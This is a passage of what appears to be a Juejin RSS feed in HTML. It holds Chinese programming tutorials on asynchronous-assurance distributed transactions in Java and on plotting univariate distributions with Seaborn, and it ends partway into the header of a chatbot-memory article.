                    <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">Long</span>&gt; <span class="hljs-selector-tag">messageIds</span> = <span class="hljs-selector-tag">messages</span><span class="hljs-selector-class">.stream</span>()
                        <span class="hljs-selector-class">.map</span>(<span class="hljs-attribute">TransactionalMessage</span>::getMessageId)
                        <span class="hljs-selector-class">.collect</span>(Collectors.<span class="hljs-built_in">toList</span>());
                    
                    <span class="hljs-selector-tag">messageDao</span><span class="hljs-selector-class">.batchUpdateStatus</span>(
                        messageIds, 
                        MessageStatus.SENT
                    );
                }
                
            } <span class="hljs-selector-tag">catch</span> (Exception e) {
                <span class="hljs-selector-tag">log</span><span class="hljs-selector-class">.error</span>(<span class="hljs-string">"批量发送失败: topic={}"</span>, topic, e);
            }
        }
    }
}
</code></pre>
<h2 data-id="heading-5">六、与其它分布式事务方案对比</h2>
<p><strong>方案对比分析</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">/**
 * 分布式事务方案比较
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransactionSolutionComparator</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">compareSolutions</span>(<span class="hljs-params"/>) {
        <span class="hljs-comment">// 性能对比</span>
        <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Integer</span>&gt; tpsComparison = <span class="hljs-title class_">Map</span>.<span class="hljs-title function_">of</span>(
            <span class="hljs-string">"XA/2PC"</span>, <span class="hljs-number">100</span>,      <span class="hljs-comment">// 低性能</span>
            <span class="hljs-string">"TCC"</span>,    <span class="hljs-number">1000</span>,     <span class="hljs-comment">// 中等性能  </span>
            <span class="hljs-string">"Saga"</span>,   <span class="hljs-number">2000</span>,     <span class="hljs-comment">// 中高性能</span>
            <span class="hljs-string">"异步确保"</span>, <span class="hljs-number">5000</span>      <span class="hljs-comment">// 高性能</span>
        );
        
        <span class="hljs-comment">// 一致性对比</span>
        <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">String</span>&gt; consistencyComparison = <span class="hljs-title class_">Map</span>.<span class="hljs-title function_">of</span>(
            <span class="hljs-string">"XA/2PC"</span>, <span class="hljs-string">"强一致性"</span>,
            <span class="hljs-string">"TCC"</span>,    <span class="hljs-string">"最终一致性"</span>,
            <span class="hljs-string">"Saga"</span>,   <span class="hljs-string">"最终一致性"</span>, 
            <span class="hljs-string">"异步确保"</span>, <span class="hljs-string">"最终一致性"</span>
        );
        
        <span class="hljs-comment">// 复杂度对比</span>
        <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">String</span>&gt; complexityComparison = <span class="hljs-title class_">Map</span>.<span class="hljs-title function_">of</span>(
            <span class="hljs-string">"XA/2PC"</span>, <span class="hljs-string">"低（数据库支持）"</span>,
            <span class="hljs-string">"TCC"</span>,    <span class="hljs-string">"高（业务侵入）"</span>,
            <span class="hljs-string">"Saga"</span>,   <span class="hljs-string">"中（补偿逻辑）"</span>,
            <span class="hljs-string">"异步确保"</span>, <span class="hljs-string">"中（消息管理）"</span>
        );
    }
}
</code></pre>
<p><strong>选型决策指南</strong>：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SolutionSelector</span> {
    <span class="hljs-keyword">public</span> String selectSolution(Requirement req) {
        <span class="hljs-keyword">if</span> (req.isFinancial() &amp;&amp; req.needStrongConsistency()) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"XA/2PC"</span>; <span class="hljs-comment">// 金融交易</span>
        }
        
        <span class="hljs-keyword">if</span> (req.isHighConcurrency() &amp;&amp; req.canAcceptEventualConsistency()) {
            <span class="hljs-keyword">if</span> (req.hasComplexCompensation()) {
                <span class="hljs-keyword">return</span> <span class="hljs-string">"TCC"</span>; <span class="hljs-comment">// 需要精确补偿</span>
            }
            <span class="hljs-keyword">return</span> <span class="hljs-string">"异步确保"</span>; <span class="hljs-comment">// 高并发场景首选</span>
        }
        
        <span class="hljs-keyword">if</span> (req.isLongRunning()) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"Saga"</span>; <span class="hljs-comment">// 长业务流程</span>
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-string">"异步确保"</span>; <span class="hljs-comment">// 默认选择</span>
    }
}
</code></pre>
<h2 data-id="heading-6">七、实际应用场景案例</h2>
<p><strong>电商下单场景实现</strong>：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">/**
 * 电商下单异步确保实现
 */</span>
<span class="hljs-keyword">@Service</span>
<span class="hljs-keyword">@Slf</span>4j
public class EcommerceOrderService {
    
    <span class="hljs-keyword">@Autowired</span>
    private OrderDao orderDao;
    
    <span class="hljs-keyword">@Autowired</span>
    private MessageDao messageDao;
    
    <span class="hljs-keyword">@Autowired</span>
    private MessageSender messageSender;
    
    <span class="hljs-keyword">@Transactional</span>
    public OrderResult createOrder(OrderRequest request) {
        <span class="hljs-comment">// 1. 参数校验</span>
        <span class="hljs-built_in">validateRequest</span>(request);
        
        <span class="hljs-comment">// 2. 创建订单（本地事务）</span>
        <span class="hljs-attribute">Order</span> <span class="hljs-attribute">order</span> = <span class="hljs-built_in">createOrderEntity</span>(request);
        orderDao<span class="hljs-selector-class">.insert</span>(order);
        
        <span class="hljs-comment">// 3. 保存消息（同一事务）</span>
        TransactionalMessage message = <span class="hljs-built_in">createOrderMessage</span>(order);
        messageDao<span class="hljs-selector-class">.insert</span>(message);
        
        <span class="hljs-comment">// 4. 返回结果（事务提交前）</span>
        return new <span class="hljs-built_in">OrderResult</span>(order.getOrderId(), "订单创建成功");
        
        <span class="hljs-comment">// 事务提交后，异步任务会发送消息触发后续操作</span>
    }
    
    <span class="hljs-comment">/**
     * 消息处理器：库存扣减
     */</span>
    <span class="hljs-keyword">@MessageListener</span>(topic = <span class="hljs-string">"order_created"</span>)
    public void handleInventoryDeduction(String message) {
        <span class="hljs-attribute">Order</span> <span class="hljs-attribute">order</span> = <span class="hljs-built_in">parseOrder</span>(message);
        
        try {
            <span class="hljs-comment">// 扣减库存</span>
            inventoryService<span class="hljs-selector-class">.deductStock</span>(
                order.getProductId(), 
                <span class="hljs-attribute">order</span><span class="hljs-selector-class">.getQuantity</span>()
            );
            
            <span class="hljs-comment">// 发送库存扣减成功消息</span>
            messageSender<span class="hljs-selector-class">.send</span>("inventory_deducted", order);
            
        } catch (Exception e) {
            log<span class="hljs-selector-class">.error</span>("库存扣减失败: orderId={}", order.getOrderId(), e);
            <span class="hljs-comment">// 重试或补偿处理</span>
            <span class="hljs-built_in">handleInventoryFailure</span>(order, e);
        }
    }
    
    <span class="hljs-comment">/**
     * 消息处理器：积分增加
     */</span>
    <span class="hljs-keyword">@MessageListener</span>(topic = <span class="hljs-string">"inventory_deducted"</span>)  
    public void handlePointsAddition(String message) {
        <span class="hljs-attribute">Order</span> <span class="hljs-attribute">order</span> = <span class="hljs-built_in">parseOrder</span>(message);
        
        try {
            <span class="hljs-comment">// 增加积分</span>
            pointsService<span class="hljs-selector-class">.addPoints</span>(
                order.getUserId(), 
                <span class="hljs-built_in">calculatePoints</span>(order.getAmount())
            );
            
            <span class="hljs-comment">// 订单流程完成</span>
            orderService<span class="hljs-selector-class">.completeOrder</span>(order.getOrderId());
            
        } catch (Exception e) {
            log<span class="hljs-selector-class">.error</span>("积分增加失败: orderId={}", order.getOrderId(), e);
            <span class="hljs-comment">// 重试或补偿处理</span>
            <span class="hljs-built_in">handlePointsFailure</span>(order, e);
        }
    }
}
</code></pre>
<h2 data-id="heading-7">八、常见问题与解决方案</h2>
<p><strong>消息可靠性保障</strong>：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">/**
 * 消息可靠性解决方案
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">MessageReliabilitySolution</span> {
    
    <span class="hljs-comment">// 问题1：消息丢失</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">solveMessageLoss</span>()</span> {
        <span class="hljs-comment">// 方案：本地消息表 + 定时任务重试</span>
        <span class="hljs-comment">// 方案：生产者确认机制</span>
        <span class="hljs-comment">// 方案：消息持久化存储</span>
    }
    
    <span class="hljs-comment">// 问题2：消息重复</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">solveMessageDuplicate</span>()</span> {
        <span class="hljs-comment">// 方案：消费者幂等性处理</span>
        <span class="hljs-comment">// 方案：唯一消息ID去重</span>
        <span class="hljs-comment">// 方案：消费状态记录</span>
    }
    
    <span class="hljs-comment">// 问题3：消息顺序</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">solveMessageOrder</span>()</span> {
        <span class="hljs-comment">// 方案：单一分区消费</span>
        <span class="hljs-comment">// 方案：版本号或序列号控制</span>
        <span class="hljs-comment">// 方案：业务层排序处理</span>
    }
    
    <span class="hljs-comment">// 问题4：系统复杂度</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">solveComplexity</span>()</span> {
        <span class="hljs-comment">// 方案：使用成熟消息中间件</span>
        <span class="hljs-comment">// 方案：封装通用消息组件</span>
        <span class="hljs-comment">// 方案：完善的监控告警</span>
    }
}
</code></pre>
<h2 data-id="heading-8">九、面试深度问答</h2>
<p><strong>Q1：异步确保型事务如何保证消息不丢失？</strong> <strong>A：</strong> 通过本地消息表在业务事务中同步保存消息，再通过定时任务异步发送，确保业务操作和消息存储的原子性。</p>
<p><strong>Q2：如何解决消息重复消费问题？</strong> <strong>A：</strong> 在消费者端实现幂等性处理，通过唯一业务ID、版本号或消费记录表来避免重复处理。</p>
<p><strong>Q3：异步确保型事务适用于哪些场景？</strong> <strong>A：</strong> 适用于高并发、对实时一致性要求不高、可以接受最终一致性的业务场景，如电商下单、日志处理、数据同步等。</p>
<p><strong>Q4：与TCC事务相比有什么优势？</strong> <strong>A：</strong> 性能更高、业务侵入性更低、实现相对简单，但一致性保证较弱，需要处理消息可靠性问题。</p>
<p><strong>Q5：如何监控和保障异步事务的健康度？</strong> <strong>A：</strong> 需要监控消息积压情况、处理延迟、失败率等指标，设置合理的告警阈值，并建立人工干预机制。</p>
<p><strong>面试技巧</strong>：</p>
<ol>
<li>从同步阻塞的问题引出异步方案的必要性</li>
<li>重点讲解本地消息表模式的核心原理</li>
<li>强调幂等性和可靠性的重要性</li>
<li>结合实际业务场景说明适用性</li>
<li>展示对优缺点和注意事项的全面理解</li>
</ol>
<p><strong>本文由微信公众号"程序员小胖"整理发布，转载请注明出处。</strong>**</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【数据操作与可视化】Serborn绘图-单变量分布]]></title>    <link>https://juejin.cn/post/7579889969985716275</link>    <guid>https://juejin.cn/post/7579889969985716275</guid>    <pubDate>2025-12-05T01:37:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579889969985716275" data-draft-id="7579889969985683507" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【数据操作与可视化】Serborn绘图-单变量分布"/> <meta itemprop="keywords" content="Python,数据可视化"/> <meta itemprop="datePublished" content="2025-12-05T01:37:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AI小云"/> <meta itemprop="url" content="https://juejin.cn/user/4153318871926912"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【数据操作与可视化】Serborn绘图-单变量分布
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4153318871926912/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AI小云
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T01:37:38.000Z" title="Fri Dec 05 2025 01:37:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">【数据操作与可视化】Serborn绘图-单变量分布</h2>
<h5 data-id="heading-1">一、简单入门</h5>
<p>Matplotlib虽然已经是比较优秀的绘图库了，但是它有个今人头疼的问题，那就是API使用过于复杂，它里面有上千个函数和参数，属于典型的那种可以用它做任何事，却无从下手。</p>
<p>Seaborn基于 Matplotlib核心库进行了更高级的API封装，可以轻松地画出更漂亮的图形，而Seaborn的漂亮主要体现在配色更加舒服，以及图形元素的样式更加细腻。</p>
<p>使用前安装和导入：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 安装 </span>
pip3 install seaborn
<span class="hljs-comment"># 导入</span>
<span class="hljs-keyword">import</span> seaborn <span class="hljs-keyword">as</span> sns
<span class="hljs-comment"># 画一张图</span>
<span class="hljs-keyword">import</span> seaborn <span class="hljs-keyword">as</span> sns
<span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt
sns.lineplot(x=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],y=[<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>])
plt.show()
​
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/adce5c33e5b44140ae077d6c26a6b7cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlsI_kupE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765503458&amp;x-signature=jZY6SZjk7A2aMoMigGOCRbSxbjc%3D" alt="1.png" loading="lazy"/></p>
<h4 data-id="heading-2">二、绘制单变量分布</h4>
<p>可以采用最简单的直方图描述单变量的分布情况。 Seaborn中提供了 distplot()函数，它默认绘制的是一个带有核密度估计曲线的直方图。 distplot()函数的语法格式如下。</p>
<pre><code class="hljs language-python" lang="python">seaborn.distplot(a, bins=<span class="hljs-literal">None</span>, hist=<span class="hljs-literal">True</span>, kde=<span class="hljs-literal">True</span>, rug=<span class="hljs-literal">False</span>, fit=<span class="hljs-literal">None</span>, color=<span class="hljs-literal">None</span>)
</code></pre>
<p>上述函数中常用参数的含义如下：</p>
<ul>
<li>(1) a：表示要观察的数据，可以是 Series、一维数组或列表。</li>
<li>(2) bins：用于控制条形的数量。</li>
<li>(3) hist：接收布尔类型，表示是否绘制(标注)直方图。</li>
<li>(4) kde：接收布尔类型，表示是否绘制高斯核密度估计曲线。</li>
<li>(5) rug：接收布尔类型，表示是否在支持的轴方向上绘制rugplot。</li>
</ul>
<p>通过 distplot())函数绘制直方图的示例如下。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">import</span> seaborn <span class="hljs-keyword">as</span> sns
<span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt
sns.<span class="hljs-built_in">set</span>()
np.random.seed(<span class="hljs-number">0</span>)  <span class="hljs-comment"># 确定随机数生成器的种子,如果不使用每次生成图形不一样</span>
arr = np.random.randn(<span class="hljs-number">100</span>)  <span class="hljs-comment"># 生成随机数组</span>
sns.distplot(arr, bins=<span class="hljs-number">10</span>, hist=<span class="hljs-literal">True</span>, kde=<span class="hljs-literal">True</span>, rug=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># 绘制直方图</span>
plt.show()
</code></pre>
<p>上述示例中，首先导入了用于生成数组的numpy库，然后使用 seaborn调用set()函数获取默认绘图，并且调用 random模块的seed函数确定随机数生成器的种子，保证每次产生的随机数是一样的，接着调用 randn()函数生成包含100个随机数的数组，最后调用 distplot()函数绘制直方图。</p>
<p>运行结果如下图所示。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09c6c8e59bca49359c5ac1c642b3cc08~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlsI_kupE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765503458&amp;x-signature=NCeHjyjLJ%2BopkYNoC5gp1Ddddr4%3D" alt="2.jpg" loading="lazy"/></p>
<p>从上图中看出：</p>
<ul>
<li>直方图共有10个条柱，每个条柱的颜色为蓝色，并且有核密度估计曲线。</li>
<li>根据条柱的高度可知，位于-1-1区间的随机数值偏多，小于-2的随机数值偏少。</li>
</ul>
<p>通常，采用直方图可以比较直观地展现样本数据的分布情况，不过，直方图存在一些问题，它会因为条柱数量的不同导致直方图的效果有很大的差异。为了解决这个问题，可以绘制核密度估计曲线进行展现。</p>
<ul>
<li><strong>核密度估计</strong>是在概率论中用来估计未知的密度函数，属于非参数检验方法之一，可以比较直观地看出数据样本本身的分布特征。</li>
</ul>
<p>通过 distplot()函数绘制核密度估计曲线的示例如下。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 创建包含500个位于[0，100]之间整数的随机数组</span>
<span class="hljs-attr">array_random</span> = np.random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>, <span class="hljs-number">500</span>)
<span class="hljs-comment"># 绘制核密度估计曲线</span>
sns.distplot(array_random, <span class="hljs-attr">hist</span>=<span class="hljs-literal">False</span>, rug=<span class="hljs-literal">True</span>)
plt.show()
</code></pre>
<p>上述示例中，首先通过 random.randint()函数返回一个最小值不低于0、最大值低于100的500个随机整数数组然后调用 displot()函数绘制核密度估计曲线。</p>
<p>运行结果如图所示。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3912ec58ffe54a8a97b6476f6b45809d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlsI_kupE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765503458&amp;x-signature=tezLr1LuBH%2FlDpsUTPQvS%2FxgYdk%3D" alt="3.jpg" loading="lazy"/></p>
<p>从上图中看出，图表中有一条核密度估计曲线，并且在x轴的上方生成了观测数值的小细条。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI Chatbot记忆系统实战：压缩策略与性能优化（上）]]></title>    <link>https://juejin.cn/post/7579961957194530866</link>    <guid>https://juejin.cn/post/7579961957194530866</guid>    <pubDate>2025-12-04T16:44:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579961957194530866" data-draft-id="7579832186880835634" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI Chatbot记忆系统实战：压缩策略与性能优化（上）"/> <meta itemprop="keywords" content="Agent"/> <meta itemprop="datePublished" content="2025-12-04T16:44:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AgentBuilder"/> <meta itemprop="url" content="https://juejin.cn/user/1567285004234219"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI Chatbot记忆系统实战：压缩策略与性能优化（上）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1567285004234219/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AgentBuilder
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T16:44:34.000Z" title="Thu Dec 04 2025 16:44:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1小时+
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 